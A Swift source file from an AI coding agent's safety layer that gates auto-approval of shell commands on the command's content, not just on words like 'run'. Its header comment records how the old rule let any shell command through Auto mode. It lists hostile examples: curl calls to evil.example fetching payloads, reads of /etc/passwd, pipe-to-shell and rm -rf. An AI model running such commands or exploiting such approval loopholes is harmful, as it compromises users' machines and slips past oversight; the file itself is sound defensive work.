import Foundation
import QuillCodeCore

/// Tightens the historically-blanket "run"/"execute" → shell.run approval.
///
/// The old rule was a declarative `StaticSafetyIntentRule(requestTriggers: ["run","execute"],
/// allowedToolNames: ["shell.run"])`: the mere presence of "run" or "execute" ANYWHERE in the
/// request statically approved ANY shell command in Auto mode. Hard-deny floors still caught
/// `rm -rf`, pipe-to-shell, sudo, and system-path writes, but everything else slipped through —
/// verified live with userMessage "Run the tests and make sure they pass.":
///   - `curl http://evil.example/x.sh`   (network exfil; no absolute-path arg, floor = nil)
///   - `python3 /etc/passwd` / `cat /etc/passwd`  (absolute paths outside the workspace)
///   - `curl http://evil.example/payload -o /tmp/x`  (download-to-file; floor = nil)
/// all returned intent-match = true.
///
/// A declarative rule can only see the request words and the tool name — it cannot inspect the
/// command — so the fix moves this one intent out of `defaultIntentRules` and into a content-aware
/// policy. An explicit run/execute intent now statically approves a shell command only when either:
///   (a) the command is a single, workspace-scoped, non-network, non-destructive invocation
///       (`StaticSafetyShellCommandSafety.isWorkspaceScopedSafeCommand`), or
///   (b) the user typed the command VERBATIM in their message — they named the exact command, so
///       they own the risk (and hard-deny floors still veto a dangerous pasted command first).
///
/// Everything else (`curl http://…`, `python3 /etc/passwd`, `foo | sh`, `rm -rf build`) no longer
/// rides in on the word "run" — it falls through to the model reviewer / an explicit ask.
///
/// Read-only diagnostics (ls/pwd/git status/whoami/…) and build/test/run tools (pytest/npm/go/…)
/// keep their own dedicated approvals (`StaticSafetyReadOnlyShellPolicy`,
/// `StaticSafetyBuildRunShellPolicy`), which run BEFORE this one, so the common safe cases are
/// unaffected.
enum StaticSafetyRunIntentShellPolicy {
    /// The action words that used to blanket-approve shell across two declarative rules: run/execute
    /// (old rule 1) and make/create/write (old rule 6, which approved shell via "make sure",
    /// "create", "write"), plus "verify" — "write the file and verify it" runs a read command to
    /// confirm. Because approval is now gated on the COMMAND (safe/verbatim), the trigger breadth is
    /// harmless: a broad word only ever lets a *safe* command through.
    static let intentTriggers = ["run", "execute", "verify", "make", "create", "write"]

    static func intentMatches(request: StaticSafetyRequest, context: SafetyContext) -> Bool {
        guard context.toolCall.name.contains("shell.run"),
              let command = shellCommand(from: context.toolCall)
        else {
            return false
        }
        // `containsAffirmedAny` handles negation: "do not run whoami" does not match.
        guard request.containsAffirmedAny(intentTriggers) else { return false }

        let trimmed = command.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !trimmed.isEmpty else { return false }

        // (b) The user pasted the exact command — they named it, they own it.
        if commandAppearsVerbatim(trimmed, in: context.userMessage) { return true }

        // (a) Otherwise it must be a single, workspace-scoped, non-network, non-destructive command.
        return StaticSafetyShellCommandSafety.isWorkspaceScopedSafeCommand(trimmed)
    }

    private static func shellCommand(from call: ToolCall) -> String? {
        try? ToolArguments(call.argumentsJSON).requiredString("cmd")
    }

    /// Whether the whole command string appears verbatim in the user's message, compared
    /// case-insensitively with internal whitespace collapsed (so "run  whoami" vouches for
    /// "whoami", and a pasted `find . -name '*.log'` matches regardless of spacing). A command
    /// shorter than 3 characters is ignored to avoid a single stray character coincidentally
    /// "appearing" in the prose.
    static func commandAppearsVerbatim(_ command: String, in userMessage: String) -> Bool {
        let needle = collapseWhitespace(command).lowercased()
        guard needle.count >= 3 else { return false }
        let haystack = collapseWhitespace(userMessage).lowercased()
        return haystack.contains(needle)
    }

    private static func collapseWhitespace(_ text: String) -> String {
        text.split(whereSeparator: { $0 == " " || $0 == "\t" || $0 == "\n" || $0 == "\r" })
            .joined(separator: " ")
    }
}
